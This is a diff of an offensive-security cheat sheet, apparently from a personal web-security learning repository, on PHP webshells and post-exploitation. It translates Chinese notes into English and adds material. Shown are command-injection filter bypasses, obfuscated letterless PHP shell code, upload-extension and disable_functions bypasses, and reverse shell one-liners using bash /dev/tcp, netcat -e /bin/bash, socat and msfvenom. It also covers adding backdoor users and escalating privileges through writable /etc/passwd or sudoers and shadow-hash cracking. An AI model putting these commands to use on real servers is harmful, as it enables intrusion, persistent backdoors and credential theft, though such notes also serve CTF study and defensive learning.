@@ -1,13 +1,4 @@
 # Webshell
-一種以網頁形式存在的命令執行環境，也稱作**網頁後門**。  
-黑客可以通過瀏覽自己放的後門，得到一個shell以操控伺服器。  
-1. 大馬  
-程式較龐大，調用system func()，通常會以加密隱藏代碼。   
-2. 小馬  
-程式小巧   
-3. 一句話木馬  
-一段小代碼，可做插入，變化多樣。  
-*  [How works](#how-works)  
 *  [Command injection](#command-injection)  
 *  [Webshell cheatsheet](#webshell-cheatsheet)  
 *  [Bypass blacklist extension](#bypass-blacklist-extension)  
@@ -17,16 +8,8 @@
 *  [Privilege escalation](#privilege-escalation)  
 *  [Reference](#reference)
 
-# How works
-我們可以通過網站自帶的文件上傳功能將webshell送上去，而文件裡的代碼由server解析進一步執行!  
-1. 尋找上傳點   
-* echo 一個shell到文件中執行  
-* 下載 shell  
-2. 繞過上傳限制 進行上傳  
-* 直接上傳  
-* 繞過  
-
 # Command injection
+In CTF, we can directly cat flag with cmd injection. In real world, we can directly make a reverse shell with it.  
 ```php
 // match one character
 cat fla?
@@ -35,13 +18,13 @@ cat ./???sword
 // match multiple character
 cat f*
 
-// 繞過空白字元限制 
+// bypass the limit on space character
 cat${IFS}flag
 cat$IFSflag
-IFS=,;`cat<<<cat,flag`    // 將,指定為分割符，將 cat,flag 作為輸入提供給 cat
-cat< flag          // 使cmd從file讀入
+IFS=,;`cat<<<cat,flag`    // assign comma to separator, let cat,flag be the input to cat
+cat< flag          // let cmd read from the file
 ```
-   
+
 # Webshell cheatsheet
 ```php
 // 回顯
@@ -106,7 +89,7 @@ param=usort(...$_GET);
 $😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;
 
 // XOR
-$😊 = "||||%-" ^ "/%/(``"; 
+$😊 = "||||%-" ^ "/%/(``";
 $😊 ("`|" ^ ",/");
 ```
 在VXCTF2018中，使用了這個無字母，無數字，無底線的shell，內容為`<?=SYSTEM(LS);`。  
@@ -129,7 +112,7 @@ can also be parsed as php file
 * `.php.xxx`  
 In old version  
 apache2 parse from the right side to left side, until it recognize the extension  
-* `.php/.` 
+* `.php/.`
 What's worth mention: this trick cannot be used to overwrite old file  
 php would recursively remove the part of `/.`.  
 [Apache2 php5 conf](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
@@ -164,19 +147,18 @@ register_tick_function ($e, $_REQUEST['pass']);
 [@lem0n Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  
 
 # Reverse shell
-目標為內網主機，外網無法發起連接。反彈shell就是webshell發起一個shell到外網，就可獲得目標的shell控制環境。  
-1. bash一句話  
+If the target is located in the intranet, I cannot connect to it from the outside then Reverse shell is your best choice. Reverse shell means the victim activate the connection to the attacker.  
+1. bash  
 ```php
 bash -i >& /dev/tcp/target_ip/8080 0>&1
 ```  
-`>&`表示聯合符號前面的內容與後面結合，重定向給後者。`0>&1`表示將`std_input`與`std_output`結合，然後重定向給`std_output`。  
-2. netcat一句話  
+`>&` means previous one combines with the following one then redirect to it. Therefore, `0>&1` means `std_input` combines with `std_output` and redirect to `std_output`.  
+2. netcat  
 ```php
-// 外網主機
-nc -lvvp 8080   // 監聽8080port
+nc -lvvp 8080   // listen to the 8080 port
 nc target_ip 8080 -t -e /bin/bash
 ```
-建立連結後執行`/bin/bash`  
+build up a connection then execute `/bin/bash`  
 3. socat  
 ```php
 socat tcp-listen:8080 -
@@ -184,31 +166,65 @@ socat tcp-listen:8080 -
 ```  
 4. python, php, java, perl  
 http://www.03sec.com/3140.shtml  
-5. msfvenom獲取payload  
+5. msfvenom can generate the payload  
 ```php
 msfvenom -l payloads cmd/unix/reverse
-// 會羅列出所有反彈腳本
+// this can list all the reverse script
 msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
 ```  
-  
-若反彈shell交互性非常差  
-1. 添加使用者  
+
+If you don't like reverse shell anymore, you can...  
+1. add user  
 ```php
 useradd new;echo 'new:password'|chpasswd
 useradd new;echo -e 'xxxxxxx' |passwd test
 ```  
-2. python獲取標準shell  
+2. Get std shell with python  
 ```php
 python -c "import pty;pty.spawn('/bin/bash')"
 ```  
 
 reference from [安全客](https://www.anquanke.com/post/id/87017)  
 
-# Privilege escalation  
-提權手勢  
-1. [利用crontab提權](https://www.anquanke.com/post/id/148564#h2-2)  
-2. [通过可写文件获取Root权限的多种方式](http://www.freebuf.com/articles/system/175086.html)  
-   改寫可寫文件的內容，可以通過SUID執行文件讓自己提升成root，或是利用`sudo -l`...
+# Privilege escalation    
+1. escalate with kernel exploit  
+```php
+uname -a // you can get the version of kernel and information
+e.g. Linux shinmao 4.17.0-kali1-amd64 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) x86_64 GNU/Linux
+```  
+search exploit in kali  
+```php
+searchsploit linux priv esc 4.17.0 kali
+```  
+We still need to compile it to run it on the victim machine!! However, in the real world we might run into the condition such that `gcc` isn't installed on the server. In addition, **reading source code** before you compile it is the most important thing!  
+
+2. `/etc/shadow` of Plain text  
+`/etc/passwd` stores the system user, `/etc/shadow` stores the hash of password  
+```php
+root:x:0:0:root:/root:/bin/bash // first column means user name, second column x means hash is in shadow
+
+root:$6$oTOxM5L9$.riBRt1HVnB5VDzDY/6FJLpMdN7pJRYDBeJGxRM1dklS/fY4if54eOK8GyFiyjS2bhuvA.CXNpGnlLs6RRXi1.:17760:0:99999:7:::
+```  
+However, in the real world we would run into the issue such as permission. If `/etc/passwd` is writeable, we can overwrite the `x` with the hash we already know. Or if `/etc/shadow` is readable, we can give the hash to john or hashcat.  
+
+3. `/etc/sudoers` is writeable  
+The document can define who is able to run `sudo`.  
+```php
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+1pwnch ALL=(ALL:ALL) ALL  
+```  
+Now you can use `sudo /bin/bash` to escalate your privilege.  
+
+4. [利用crontab提權](https://www.anquanke.com/post/id/148564#h2-2)  
+```php
+ls -l /etc/cron*
+```  
+
+5. [通过可写文件获取Root权限的多种方式](http://www.freebuf.com/articles/system/175086.html)  
+   Run the root's script which has SUID can also help escalate to root...  
+
+Therefore, we need to find the vulnerability efficiently. You can find some script to brute check, or you can check manually here [basic linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation).  
 
 ### Reference  
 * [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
@@ -218,4 +234,5 @@ reference from [安全客](https://www.anquanke.com/post/id/87017)
 * [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
 * [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)  
 * [stackoverflow Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
-* [Ali0thNotes PHP代码审计归纳](https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md)
+* [Ali0thNotes PHP代码审计归纳](https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md)  
+* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
